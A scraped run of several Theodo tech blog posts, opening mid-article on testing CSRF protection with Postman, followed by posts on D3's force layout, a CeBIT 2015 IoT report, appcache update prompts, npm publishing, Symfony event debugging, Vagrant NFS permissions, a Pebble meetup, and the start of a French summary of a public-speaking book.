It is important to note that only your POST requests will include this header, therefore your GET requests are not protected. Csurf could also find the token when it is in one ot the two following locations : req.body._csrf or req.query._csrf. This means that if you really want to protect a GET request that you don’t want to use POST method for, you may add the value of the token within the field ‘_csrf’ in your query string.
How to be sure it works?
I used the Postman REST Client plugin for Google Chrome. This will help us simulate an attack on the application.
I choose the POST method (as I said, only POST requests are automatically protected), I enter the request URL in the corresponding field (for instance: myapplication.com/user/delete. I then fill in the key/value paired fields with correct pairs, for instance userId as a key, and 42 as the associated value.
I then click on the Send button, and boom! I get a response with a 403 status.

That’s good! Let’s test if the request works when the headers are correctly set now. To do this, I go on the page of my application in which I can really delete the user. I check my cookies (in Google Chrome, press F12, click on Resources and then on Cookies), and I copy the value contained in the cookie named x-xsrf-cookie. In Postman, I click on the Headers (0) button, and I paste the value in the ‘Value’ input. Then, in the ‘Header’ input, I type X-XSRF-COOKIE. I click on Send once again. And, this time it works! The application sent back a correct response with good informations concerning the deleted user, and with a 200 status.

Your app is now more secure, congratulations!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Paul Molin
  			
  				  			
  		
    
			

									"
"
										.link {stroke: white; stroke-width: 1.2px;} .d3-force-layout-figure svg {display: block; margin: 0 auto;}

var w = 580, h = 400, backgroundColor = 'black';
The code shown below comes from the D3js website and the tons of examples it provides.
What is the force layout?
D3’s layouts are methods that let you easily display complex datasets in relevant charts with little effort.
You can learn more about all of D3’s layouts in the library’s documenation.
The force layout, like all other layouts, provides us with tools that let us arrange our data on a chart. But it does so using physical simulation.
How is physical simulation relevant in dataviz?
Take the messy chart below. All its points are randomly positioned inside the black container. But if you click on that mess…


… it triggers a physical simulation that gives sense to the previous mess, gently revealing the relations between all our datapoints.
Noone had to set up the points’ positions. They just figured out where to go by themselves.
Inserting points
Now you understand why D3’s force layout can be useful. Let’s take some time to understand how it works. I will will walk you through a few examples showing what the force layout is made of and why it serves our purpose of displaying complex graphs.
But, what’s a graph?
A graph, in mathematics, is a set of vertices connected by edges. So, let’s generate a few vertices inside our container.
In order to make the following examples interactive, we will add these points by moving our cursor over the workspace instead of, say, loading them from a file (like in the first example above).


There shall be movement
We would like to give these points some movement. We will give each point an impulsion based on our cursor’s current and previous positions. To do so, we set each nodes’ px and py properties with the variation of our cursor’s x and y coordinates.
Based on these properties, the force layout will handle the animation of all the points.


Obeying Newton’s first law, our point float towards infinity…
So let’s set up a little friction to prevent them from going too far.


D3 actually sets the friction parameter to 0.9 by default. So setting it yourself is not mandatory.
Our scene is getting messy. There is no interaction between the points so they are overlapping each another. We can fix that by setting a repulsive force that will keep points apart. We do so by using the force layout’s charge parameter and setting it to a negative value.


Once again, D3 sets the charge parameter to -30 by default.
Now, our points keep pushing each other far outside our small SVG container. We can prevent this by using another handy tool: the gravity parameter. It simulates a force that attracts all the points towards the center of the container.


I don’t think Mike Bostock has implemented gravity into D3’s force layout for the beauty of science. It allows us to keep our data points floating towards the center of our document instead of spreading randomly. That’s pretty handy!
Gravity defaults to 0.1 so you don’t necessarily have to set it yourself.
In the loop
Ok, now that we have grasped the basics of the force layout, I would like to take a step back and give you a hint of how this works.
The force layout runs a simulation that changes the positions of nodes according to a few laws of physics.
At every step, the new position of a node is computed based on its previous position and the various interactions it has with it’s environment (friction, repulsion, gravity, etc.).
You can pause and resume this simulation whenever you want.
In the next example, the layout is stopped and started at every mouse click by using force.stop() and force.start() methods.


This looks quite good. But our data is not yet very interesting. There actually is no data at all.
Let’s add two random properties to each of our nodes: size and value. We will visualize these properties respectively as size and color.


Nodes are overlapping again. How can we fix this? We could set each node’s charge depending on it’s size but the nodes would still overlap for a short time before the layout stabilises. Plus there’s a cooler thing I would like to show you.
We will add a collision detection function.


To achieve this effect, we hooked into the simulation loop, taking advantage of the tick event. This event is triggered at every step of the simulation and allows you to take control of everything that’s happening in the force layout.
force.on('tick', function (e) {
  var nodes = force.nodes();
  var k = e.alpha * .1;
  var q = d3.geom.quadtree(nodes),
  i = 0,
  n = nodes.length;
  while (++i < n) q.visit(collide(nodes[i]));
  svgContainer.selectAll('circle')
    .attr('cx', function (d) { return d.x; })
    .attr('cy', function (d) { return d.y; });
});
Adding links
As I said earlier, a graph is a set of vertices connected by edges. We have the vertices. Let's add the edges, or links, as they are called in D3. Every time we insert a new point in the graph below, we randomly connect it to an existing point.


To add a link in the simulation, you have to create an object with two straightforward properties:
link = {
  source: node,
  target: force.nodes()[Math.floor(Math.random() * force.nodes().length)]
}
And then you must insert the new link into the list of links handled by the simulation:
force.links().push(link);
If you wish the new link to show up on your screen, you need to bind it to an SVG line:
svgContainer.append('svg:line')
  .data([link])
  .attr('stroke', 'red')
  .attr('stroke-width', 1.5);
And finally you need to update each line's ends on every tick:
svgContainer.selectAll('line')
  .attr('x1', function(d) { return d.source.x; })
  .attr('y1', function(d) { return d.source.y; })
  .attr('x2', function(d) { return d.target.x; })
  .attr('y2', function(d) { return d.target.y; });
Conclusion
I wrote this article after a presentation I gave at a recent Meetup about D3 in Paris. I had also made a quick comparison between svg and canvas when using the force layout. Stay tuned for a short article on that subject in the near future.
Thanks for reading and feel free to leave your comments below!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jean-Rémi Beaudoin
  			
  				  			
  		
    
			

									"
"
										On Monday, March 16, I got the chance to attend the first day of CeBIT 2015 in Hannover, Germany, the biggest Computer science related fair of the world (Wikipedia says) and more specifically the Code_n building which theme was “Into the internet of Things”. Code_n is defined as an “initiative [that] offers an ecosystem designed to network digital pioneers and support the development of new, digital business models.” according to their website. In other words, it is one of the many helpers for startups to grow, get known and get to know other actors in their space or related spaces. In this objective, it comes every year at CeBIT and offers a space for startups to present their work and network.
It is actually hard to say “I attended CeBIT” because you can’t humanly attend each and every thing at CeBIT, which happens over an area of 450 000 square meters and over 20 buildings. From Enterprise level IT groups to chinese smartphone waterproof accessories manufacturers, smart dartboards startups and drones companies, you can see anything at CeBIT.
 

This article is therefore an extract of what I saw in the Code_n building and its core theme that make a lot of people right on the internet today : The Internet Of Things.
An IoT welcome – Robochop
The thing

When entering the Code_n building, the first (and almost only) thing you could see was Robochop.
An installation of 3 industrial robots cutting polystyrene cubes automatically.
The particularity of these cuts is that the designs of all of them have been created by people around the world in a web interface, and will be sent to their creators just after CeBIT.
See website: http://www.robochop.com/
The story
Clemens Weisshaar is a designer trying to make the line between digital and physical world vanish.
He already had some projects in his past relating to this theme:
* A “Magic mirror” for retail (in the PRADA Epicenter in Beverly hills) : A camera films you and when you turn, it slows down the time so that you can see your back and how the clothes fit you.
* Breeding tables – centre Pompidou: A concept of tables, each unique because randomly generated but mechanichally strong enough for being a table and manufactered only by cutting and bending steel.
* OutRace : A robotic installation doing light painting of tweets sent by people on Trafalgar square in London.
* RT18 chair prototype : The designer (with the help of Reed Kram as well) created a chair full of sensors to see constraints, visualizable in real-time on a screen facing the chair and allowed people to sit and play with it. With the data they retrieved during this experiment, they were then able to create the lightest chair ever (2.2kg).
With his latest projects, Clemens Weisshaar wanted to assemble Design, Engineering, Giving code to the machine and Shipping all in one application, as in a production line. And when possible give the power to users in the process.
Clemens Weisshaar and Reed Kram connect people to heavy machinery and Robochop is their latest piece of Art and Technology.
The big trends I felt
Being THE platform
“One platform to rule them all, One platform to find them,
One platform to bring them all and in the darkness bind them”

A lot of startups out there are interested in binding all your smart objects together for different purposes:

Cozify, for example, is a Finnish startup that creates a mobile app to allow you to group, control and manage your smart devices at home in a simple way.
Wicross is a French company that wants to bring together all the Data of your smart devices, and create a platform to “sell”/exchange this data to/with big companies to get better services or additional value out of your devices.
ReelyActive is not only in this scope but partly wants to be the open-source platform on which you can host your identity linked to one or several of your smart devices (for example, your smartwatch becomes your ID card in the virtual world (but I’ll explain reelyActive’s activity in more details a bit further in this article)
Homey One of my favourites, is a small ball-ish device (very similar to the Nexus Q in design and, I asked them, they totally stole the idea) that you will surely place in your living room and whom you can talk to to control your devices. Some of the examples were “Homey, can you turn the lights to green please? (not mandatory)” > Homey connects to the Philips Hue light bulbs and turns them green.
Muzzley One app to control, connect to all your devices and display their updates
PipesBox Pretty similar
Many more in a more B2B manner: Carriots, Com2m, Sensefinity, M2MGO …

Security/Security without keys

We knew it already with the success of MyFox at CES, but security is a big concern for customers, and many entrepreneurs see in this area a big opportunity.

Kiwi.Ki creates a system that allows you to enter your building thanks to a transponder that you can keep in your pocket or thanks to your smartphone.
FUZ design (changing name soon) does different types of Locks for your bike, your fence or your container that you can open with Bluetooth and you can manage the access to (You can lend your bike to a friend for example)
Evercam : Apps for cameras over Ip
LEAPIN Digital Keys manufacters door locks that you can open with your phone (targetting the hostel’s card lock mostly)
Novi The 2.0 version of your house alarm/smoke detector

Indoor navigation/location

ConTagt
Loopd (more or less) creates small beacons for events/museums to gather analytics about visitors.
Xetal Indoor localization without beacons

Parking

I would never have thought that, as a not-so-much car driver, but Parking seems to really be a big problem in our everyday lives.
Proof ?
At least 3 startups of the 50 finalists chosen by Code_n try to tackle this problem (and you can find more online or in this article).

ComThings does a Cloud connected Universal Remote to open all your doors and garages
ParkPocket is working on a mobile phone app to find and rent a Parking spot easily
ParkTag Automatically predicts which park spaces will be free soon

More in depth with a startup (my favourite) : ReelyActive

ReelyActive is a Montreal company founded in 2012. After getting some interest by participating to the Founder Fuel Fall 2012 session, ReelyActive published three scientific papers to support the science behind their vision and their product and has been title “World’s best startup” in November 2013.
Their main hardware product is a set of sensors called “reelceivers” available for Bluetooth or RFID detection that connect to the network through RJ45 ports and enter in communication with a hub that needs to be on the network.

The idea is then to bridge your physical world to the virtual world and the potential of this technology is awesome. From the smart home to the smart museum, the smart office or the smart parking, ReelyActive is just making it able to turn any space in a smart space.
The whole software side is then open-source and based on NodeJS technology. Documentation and tutorials are available on github, along with all the code allowing you to super easily plug your sensor and start decoding bluetooth communication and even visualising them easily in a smartspace !

Conferences
With just one day to attend, I didn’t see a lot of conferences (sadly did’nt have the chance to see Edward Snowden live conference) but I still manage to see two of them (without considering a Pitch & Question session), that I will summarize in bullet points hereafter – to be honest, because it was a bit disappointing.
Into the internet of the customers (Salesforce):

What’s important in your app, service, [fill the blank], … ? The Customer
Salesforce: #1 CRM for Marketing, analysis, communication with partners, most innovative company according to Forbes
At Salesforce, 1% of the time of everyone, the equity of the company and the money won by the product are given to social
How Robochop works with salesforce : data retrieved from the robots : problems, performance, production rate, where the “commands” come from, etc. (pretty cool actually)

Opportunities for a digital Germany (Google):

Internet is for everyone.
More devices every day : wear, car, smart phones
Every business can compete with big groups now
Every business is a digital business as well (or should be)
However, founding a company is hard in Europe (harder than in the US?) => Google helps (the factory (Berlin), Google ventures Europe,…)

In conclusion, this day has been a really busy day at CeBIT and the Internet of Things seems to have always more new actors and for me, the small startups are definitely eating more and more of the pie of innovation and new markets compared to the giants (Google’s booth and conference were really disappointing).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Adrien Thiery
  			
  				Adrien Thiery is an agile Web Developer at Theodo and likes Design, Technology and the Internet of Things. You can learn more about him on http://www.thiery.io/  			
  		
    
			

									"
"
										It is common, for web developers, to assume that users will always use their products in near-optimal situations: a recent browser on a fast device, with a steady WiFi connection. However, when building mobile-first webapps, the last assumption is a dangerous one to make. Network connectivity on mobile devices is all but granted: a poor cellular reception, a subway ride or a remote holiday estination can have disastrous impacts on the user experience.
In this excellent A List Apart article, Alex Feyerke notes that developers should “stop treating offline like an error”:
Stop treating a lack of connectivity like an error. Your app should be able to handle disconnections and get on with business as gracefully as possible.
Offline-first webapps are a gracious way to guarantee a worst-case user experience that can be controlled and fine-tuned by developers. Their implementations usually rely heavily on the Application Cache, an HTML5 flagship feature used to specify which resources must be cached by the browser for the app (or a predefined subset of the app) to keep working without any network connectivity.
I am currently working on a offline-first project, and a problem arose: as the browser cached all static assets (stylesheets, vendor libraries and the AngularJS app), users were not systematically browsing the latest version of the website. This was contradicting the premise of the Agile philosophy, as we wouldn’t have user feedback as quickly as we wished on the recently pushed functionalities.
The solution we envisioned was to prompt the user a message each time a new build was pushed in production, notifying them of the update and inviting them to refresh the page to enjoy the latest version. In this article I will try and explain as precisely as possible the implementation of this feature.
The cache manifest
The cache manifest is the file that indicates to the browser which folders or files to cache. The browser will only update the cached files (retrieving them from the server) when the cache manifest is modified. It is thus possible to include a commented line in the manifest, and to modify this line in order to notify the browser that the source code has been updated.
For convenience, we used a gulp plugin named gulp-manifest which programmatically generates a manifest file with each build, and appends to it a commented sha256 hash of all source files. That way, each build will trigger a cache refresh on client browsers.
It is important that the manifest file is served with a particular MIME type: text/cache-manifest. Otherwise, browsers will not recognize the manifest and cache the files. Webservers must be configured accordingly (considering that the manifest file has the extension .appcache):

Nginx in the mime.types file, add the following line: text/cache-manifest appcache;
Apache: in the .htaccess file, add the following line: AddType text/cache-manifest .appcache
Express: add the following route:

app.get '/*.appcache', (req, res) ->
  res.header 'Content-Type', 'text/cache-manifest'
  res.end 'CACHE MANIFEST'

The Angular directive
We built an Angular directive that shows a non-intrusive alert at the top of the page to notify the user of an update.
The controller runs a routine every minutes, checking the status of the window.applicationcache variable. If an update is available, the cache is updated, then the alert is displayed, prompting the user to reload the page for the changes to be applied.
directive.coffee:
angular.module 'refresh-app' 
.directive 'refreshApp', -> 
  restrict: 'A'
  templateUrl: 'utils/refresh-app/template.html' 
  controller: 'controller' 
  scope: {} 
  link: ($scope, element, attrs) -> 
    $scope.$watch 'hidden', (newValue) -> 
      return element.slideUp() if newValue 
      element.slideDown() if not newValue

controller.coffee:
angular.module 'refresh-app' 
.controller 'refreshAppController', ($scope, $timeout, $window) -> 
  $scope.hidden = true 
  appCache = $window.applicationCache
  $scope.close = -> 
    closed = true 
    $scope.hidden = true

  if appCache and appCache.status isnt (appCache.UNCACHED or appCache.OBSOLETE)
    appCache.addEventListener 'updateready', -> 
      # Listener for when a new version is available
      $scope.hidden = false if appCache.status is appCache.UPDATEREADY

      checkForUpdates = -> appCache.update() 
        # Chech every minute if a new version is available 
        $timeout checkForUpdates, 60 * 1000

      checkForUpdates() # Launches the routine

template.jade:
.container
  button.close( 
    type='button'
    aria-hidden='true'
    ng-click='close()'
  ) &times; 
  p A new version of this app is available&emsp;
  button.refresh-app-btn(onclick='window.location.reload()') 
    i.glyphicon.glyphicon-refresh
    | Update  

A message is now displayed when the app cache was updated:

The HTTP cache headers
Cache headers are inserted by the webserver to indicate to the browser which files must not be cached, or the maximum amount of times files can be kept in the cache. In our project, we wanted the browser to cache only the assets files (for offline browsing), not
API calls (for security reasons). We had to apply cache headers selectively on our webserver, here Express:
# Assets routes, caching is authorized 
app.use('/assets/', express.static(__dirname+'/../www')) 
app.use(express.static(__dirname+'/../www'))

# Avoid caching API results: apply cache headers 
app.use (req, res, next) -> 
  res.header 'Cache-Control', 'no-cache, no-store, must-revalidate' 
  res.header 'Pragma', 'no-cache'
  res.header 'Expires', 0 
  next()

# API routes, caching is not authorized 
app.use('/api/v1/', (req, res) -> 
  console.log 'Api calls…' 

Note: the Pragma header is the HTTP/1.0 version of the Cache-Control header
In the case where cache headers are still present on static files, a proxy may be intercepting responses. It is then possible to modify the Apache or Nginx configuration to remove the cache headers.
A particular attention must be paid to the cache-control: no-store header. Indeed, this header is set alongside with a cache manifest, files will keep being cached on Chrome, Opera and Safari, but not on Firefox.
Debugging the offline webapp
Browsers offers a set of tools to debug an offline-ready webapp, which can be very practical to detect errors in the manifest file.
On Chrome
Chrome offers an interface to see which apps are cached by the browser, and for each the details of the cached files.
In the searchbar, enter chrome://appcache-internals to display the list of cached apps.

On Firefox
Firefox offers a command line interface to nevigate within the application cache.
To open the CLI, enter <shift><F2>. The command help appcache displays the list of available appcache commands :

Conclusion
Automatic updates are great for both the developers, who benefit from faster feedback on new features, and the users, whose application is always up-to-date. It also eases greatly the testing and development process, as cache must not be emptied each time an update is pushed. A nice addition in our Agile toolbox !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Goutay
  			
  				Webdeveloper at Theodo. Webdesign & UX enthusiast.  			
  		
    
			

									"
"
										
  
    
  

I just made an npm package: gulp-backpack and it was pretty easy to publish it to npm!
Therefore I wanted to share what you need to know so you can do it too.
Create your package
Obviously before publishing anything you’ll need to code it!
Package.json
The core of your node package is the package.json file.
If there is one file you should care about, it’s this one.
There is a nice documentation about what you must and what you can do with this file.
Here are the most important aspects of the package.json file:
The name and the version of your package are required to allow people to install the package
Add the dependencies needed for your package.
Add some entries so npm users will have a better understanding of your package like description, license, author, homepage, keywords, repository
Scripts section should contain the tests of your application because anyone should be able to run them with a npm test.
Require your module
When you want to use your module in a js program, you require it. You do something like
gbp = require 'gulp-backpack'
gbp.gulp.task 'clean', ->
  gbp.del.sync 'www'

You may wonder which file will be called when you require the module. The rule is simple:
It will run the *index.js* in the root directory of your module
Unless you specify a *main* entry in your package.json

By the way, have you ever asked yourself wtf is going on when you require a module ?
Write or at least build your module in JS
You may code in CoffeeScript but don’t forget that it’s not everyone’s case. As you go open source, you want to target as many people as you can !
Test your module
 
When you are coding for open source, you can use a lot of nice tools for free.
For testing purposes, you can use Travis to run your tests and Coveralls for your code coverage.
Add a .travis.yml file to tell travis what it has to do.
If you don’t know how to configure Travis have a look at Reynald’s tutorial.
For a node package it’s pretty simple because travis will automatically run npm install and npm test.
You can easily tell travis with which version of node you want the tests to be run:
node_js:
  - ""0.10""
  - ""0.12""
  - ""iojs""
after_script:
  - npm run coveralls

Building a CLI tool
If you are willing to create a CLI tool. I advise you to use Liftoff, it will help you a lot!
Publishing
As the official documentation is not so explicit, I had to search a little bit.
I finally found this excellent Gist written by AJ ONeal.
Thanks to him I was able to follow theses simple steps to publish my package.
Create an npm user
You need to create a user on the npm’s platform. Use the npm command for that, no need to sign up on the website.
First you have to configure your author informations so that npm can create your account.
npm set init.author.name ""Your Name""
npm set init.author.email ""you@example.com""
npm set init.author.url ""http://yourblog.com""

Then you are good to create your user. Use the npm command line as well.
npm adduser

It will ask your three questions…
The username you want to use for your npm's account
The password of your npm's account.
The email you will use for your npm's account. It will be publicly shown on the npm's website

…and it’s done! Don’t worry if there is no confirmation message.
Just go to https://www.npmjs.com/~ to check that your account has been created.
Publish
This part is for very skilled developers because you have to run:
npm publish

and you are done. You can search your package: it should already be available.
gulp-backpack

  
    
  

A little more about gulp-backpack. As I said in the README:
This repository is meant to simplifies the inclusion of all those tools and gulp plugins we all need to compile our angular apps with using gulp. One gulp-backpack to gulp them all!
I will enjoy any feedback about it!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										Ever found yourself stuck in a stack of subscribers and listeners, unable to determine why and which class has modified your object after an event has been dispatched?
The old solution
Previously, you could search in your code for the name of the event. But even if you have a constant for the event name, sometimes listeners are registered directly in the Dependency Injection Container, or worse, dynamically.
Furthermore, how to detect the execution order of the listeners? Does a higher priority imply an earlier execution? And what if two events have the same priority? You would have to know exactly how the framework works internally, and sometimes you just want a quick explanation of what is happening.
debug:event-dispatcher at the rescue
To face this, I proposed a new command in Symfony, available since version 2.6:
$ app/console debug:event-dispatcher

The default behavior is to list all the events in your application which have at least one registered listener/subscriber, and give you all theses listeners/subscribers ordered by their descending priority (i.e. their execution order).
[event_dispatcher] Registered listeners by event

[Event] console.command
+-------+-------------------------------------------------------------------------------+
| Order | Callable                                                                      |
+-------+-------------------------------------------------------------------------------+
| #1    | Symfony\Component\HttpKernel\EventListener\DebugHandlersListener::configure() |
| #2    | Symfony\Bridge\Monolog\Handler\ConsoleHandler::onCommand()                    |
| #3    | Symfony\Bridge\Monolog\Handler\ConsoleHandler::onCommand()                    |
+-------+-------------------------------------------------------------------------------+

[Event] console.terminate
+-------+-----------------------------------------------------------------------------------+
| Order | Callable                                                                          |
+-------+-----------------------------------------------------------------------------------+
| #1    | Symfony\Bundle\SwiftmailerBundle\EventListener\EmailSenderListener::onTerminate() |
.
.
.

The command fetches any listeners/subscribers, even if they are registered dynamically and not declared as services.
Debug a specific event
If you want to debug a specific event, just give the event name to the command:
app/console debug:event-dispatcher kernel.request

[event_dispatcher] Registered listeners for event kernel.request

+-------+----------------------------------------------------------------------------------+
| Order | Callable                                                                         |
+-------+----------------------------------------------------------------------------------+
| #1    | Symfony\Component\HttpKernel\EventListener\DebugHandlersListener::configure()    |
| #2    | Symfony\Component\HttpKernel\EventListener\ProfilerListener::onKernelRequest()   |
| #3    | Symfony\Component\HttpKernel\EventListener\DumpListener::configure()             |
| #4    | Symfony\Bundle\FrameworkBundle\EventListener\SessionListener::onKernelRequest()  |
| #5    | Symfony\Component\HttpKernel\EventListener\FragmentListener::onKernelRequest()   |
| #6    | Symfony\Component\HttpKernel\EventListener\RouterListener::onKernelRequest()     |
| #7    | Symfony\Component\HttpKernel\EventListener\LocaleListener::onKernelRequest()     |
| #8    | Symfony\Component\HttpKernel\EventListener\TranslatorListener::onKernelRequest() |
| #9    | Symfony\Component\Security\Http\Firewall::onKernelRequest()                      |
| #10   | Symfony\Bundle\AsseticBundle\EventListener\RequestListener::onKernelRequest()    |
+-------+----------------------------------------------------------------------------------+

Feedback and contributions welcome
Do you find this command useful? Do you have suggestions to improve the readability? Feel free to comment here, open a issue or propose a Pull Request on Github.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Matthieu Auger
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
If you ever tried to sync folder between a host machine and a guest one with vagrant over nfs, you may have noticed that everything is ok until you need your shared folder to be owned by a non root user.
Syncing over NFS as non root
I read this good article which describes the solution: share the same UID:GID between your host and your guest.
To provision my base box I use Ansible. The plan is to create a user on the guest with Ansible. This user will have the same uid and guid than the user who runs the vagrant up but with custom username and group name.
Ansible provides a lookup function that allows you to run shell command on your host and bring the result into your guest. That’s how I used it.
myproject/playbook.yml

---
- hosts: stage
sudo: yes
gather_facts: true
roles:
- { role: user }

myproject/hosts/stage

app_user=georges
app_group=georges
home_path=/home/georges

myproject/roles/user/tasks/main.yml

---
- name: Create specific app group
group: gid={{ lookup('pipe', 'id -g') }} name={{ app_group }} state=present

- name: Create specific app user
user: uid={{ lookup('pipe', 'id -u') }} name={{ app_user }} group={{ app_group }} state=present home={{ home_path }}

myproject/Vagrantfile

[...]
config.vm.synced_folder ""../host_shared"", ""/home/georges/guest_shared"", type: ""nfs"", create: true
config.vm.provision :ansible do |ansible|
ansible.inventory_path = ""hosts/stage""
ansible.sudo = true
ansible.playbook = ""playbook.yml""
end
[...]

Run vagrant up and here you go! Your folders will now be owned by user georges in your guest machine.
Pitfalls
Here are four pitfalls in witch I throw myself in.

1. The simplest solution would be to use the UID environment variable, but for some reason UID seems not to be available whith lookup. An alternate solution would be using a temp variable export USER_ID=$UID, and then {{ lookup('env', 'USER_ID') }}. It will work, but requires modifying your host environment specifically for this fix, which I did not want to do.


2. My research leads me to use rsync rather than NFS. Indeed, rsync allows you to choose a custom owner for your shared folder:
config.vm.synced_folder ""../host_shared"", ""/home/georges/guest_shared"", type: ""rsync"", user: ""georges"", group: ""georges"", create: true
. The user an group options will not work with NFS. Again, this is not a good solution: rsync took more than 4 seconds in most of the cases to sync the files of my project.


3. Beware that you may have conflicts with host’s UIDs and guest’s ones. For me it went like clockwork since my host was an Ubuntu, meaning that custom user’s UID starts at 1000, and my guest box was a CentOs with no UID upper than 500.


4. You may encouter the following problem: the first sync may result in guest synced folder owned by root. This is because the user with your UID is not created at first vagrant up. See [this thread](https://github.com/mitchellh/vagrant/issues/936) for more information. I solved it by adding a file action in my ansible playbook to change the ownership of this folder: file: path=/home/georges/guest_shared state=directory mode=755 owner={{ app_user }} group={{ app_group }}. This is not clean but it works.



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										Pebble Meetup 2015-06-01 @Ecole 42

I went to a Pebble meetup at Ecole 42, and since I’m really into connected objects, I discovered there some awesome things that you can do with the Pebble watch that I would like to share with my fellow Connected Objects enthusiasts. Firstly I would like to share some of the greatest moments of the talks of Thomas Sarlandie (@sarfata) Developer Evangelist at Pebble and of the lightning talks (lasting from 5 to 10 minutes) that followed, then what I like most about the Pebble.
Thomas’ introduction on Pebble
Thomas first described what Pebble is: it’s a smartwatch quite unlike the others since it has no touch screen, instead it has 4 buttons. Why is that? It allows Pebble to have a much longer battery life: from 4 to 7 days.
He then delved into Pebble’s features (which you can find listed here). Pebble is equipped with an accelerometer, a compass and an ambient light sensor and you can connect it to your smartphone by bluetooth 4.0. Some things to note: Pebble has 128kB of RAM so if you decide to jump in and develop your own pebble app, you might have to optimize your code in order to have it run smoothly.
Watchfaces and apps
There are two kinds of apps that you can install on Pebble: watchfaces which allow you to customize the display of the hour (by adding weather or activity information) and apps which allow you to do various kinds of things among which: take a picture, change the music on your phone or check your gps navigation, but I’ll come back to that later. One other piece of information to note: you can only have at most 8 apps or watchfaces loaded on the watch at any given time.

Developing on Pebble…
So, how do I make my own app? There are several ways to do that, depending on the app you want to make:
Pebble C: Apps running on Pebble are written in C, so if you want to make an app that needs no communication with your phone (such as a watchface or Tiny bird) or if you want to build an optimal app, you can use the Pebble C SDK.
PebbleKit: If you already have a mobile app that you want to use on your Pebble, then PebbleKit is for you: it allows you to push notifications on the Pebble and exchange data with an app running on the Pebble.
PebbleKit JS: If you want to build an app on the Pebble and use the features of the phone (without having to launch an app on your phone), then PebbleKit JS is the solution. Build your app using the C SDK and run JavaScript on you phone, thus your app can access the internet, the phone’s GPS, persist data on the phone and so on…
But if you are allergic to C, then you may want to check out Pebble.js. It lets you run JavaScript applications on your phone which can access all the resources of the phone as well as communicate with the Pebble. However, as they run only on the phone, the required Bluetooth protocol uses more power and makes the app slower than a native app.
One last thing to mention about building Pebble apps: Pebble has made a free cloud platform: CloudPebble which allows you to easily make new apps by using existing templates as well as compile your app. All these features add up to make a really user-friendly development environment!
Ligthning Talks:
Thomas’ talk was followed by four lightning talks which I will describe in a few words:
In the first talk, Thê-Minh TRINH and Antoine Kuhn from Applidium presented their app which allows you to see your public transportation itinerary and go through the connections you have to make. This allows you to see exactly where you have to go without having to find your phone lost in the depths of your pocket. (This app is not available yet).
The second described app allows you to see a black and white version of what the phone’s camera is sensing and take pictures.
Then we were introduced to the Connected Challenge, an online hackathon dedicated to Connected objects in which start-ups and big companies have made their APIs available.
Finally, a really interesting talk about what you can do when you combine Pebble with Tasker(“Tasker is an application for Android which performs tasks (sets of actions) based on contexts (application, time, date, location, event, gesture) in user-defined profiles or in clickable or timer home screen widgets.”) such as have your public transportation notifications transferred to Pebble only when you are at home and it is earlier than 8am or at the office and later than 6pm.
What’s there to like about Pebble?
So it’s been a week since I got my own Pebble and I have found some of its features quite enjoyable such as getting e-mail, agenda and SMS notifications, controlling the music without having to take my phone out of my pocket and having the GPS navigation (with Nav me) on your watch really comes in handy when you’re riding your bicyle and like me you have no sense of direction ☺.

I don’t find the lack of touchscreen detrimental as I don’t expect my watch to replace my phone and the existing 4 buttons are sufficient for most tasks and this allows the watch to have a way longer battery life, which is nice. However, as one may expect some of the apps you can find are a little buggy at times. Furthermore, being able to use only 8 apps or watchfaces at a time is quite constraining as some of the applications the watch is shipped with (such as the music controller) could use some improvements, which has been done by some apps you can find on the app store.
Conclusion
As you may have noticed, I am quite thrilled by my new watch, despite its limitations and I will definitely dive into the possibilities of combining it with Tasker. The meetup was really informative and interesting for Pebble beginners such as myself and more advanced Pebble users can discover use cases they might not have thought of so do not hesitate to come and join us and spend some enjoyable time ☺.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				François Plesse
  			
  				François Plesse is a web developper at Theodo. He's also a geek, into connected objects and fascinated by everything related to machine learning.  			
  		
    
			

									"
"
										Il y a quelques mois, je suis tombé par hasard sur une vidéo du site ted.com et j’ai tout de suite accroché. Pour ceux qui ne connaissent pas, les conférences TED sont une suite de talks d’une dizaine de minutes sur pleins de sujets différents.Je suis allé sur le site et j’ai alors commencé à enchaîner les vidéos. Je me suis alors fait la promesse de ne plus regarder de séries mais des vidéos TED afin de me coucher un peu moins bête tous les soirs.
Aujourd’hui, je continue d’en regarder fréquement même si Game of Thrones a eu raison de ma promesse. C’est pourquoi quand mon collègue Jonathan m’a parlé du livre dont je vais vous faire le résumé, j’ai tout de suite sauté sur l’occasion. Il s’agit de “Révélez le speaker qui est en vous” de Michel Lévy-Provençal dont je recommande fortement la lecture si vous voulez vous exprimer en public lors d’une conférence ou d’un talk.
Michel Lévy-Provençal s’occupe de TEDxParis et il utilise sa méthode BRIGHTNESS pour coacher les talkers.
Vision générale du talk
Il faut tout d’abord trouver le message que vous voulez transmettre à votre public.
Le message doit être adapté au public et doit pouvoir se résumer très facilement, sous forme d’un tweet par exemple. La règle importante à retenir est : “Un talk, un message”. Ensuite il faut se demander :
“Que voulez-vous transmettre ? Est-ce une information clé ? Un call to action pour inviter les gens à se sentir concerné?
Le partage d’une vision, d’une expertise, la conclusion d’une expérience vécue ?”
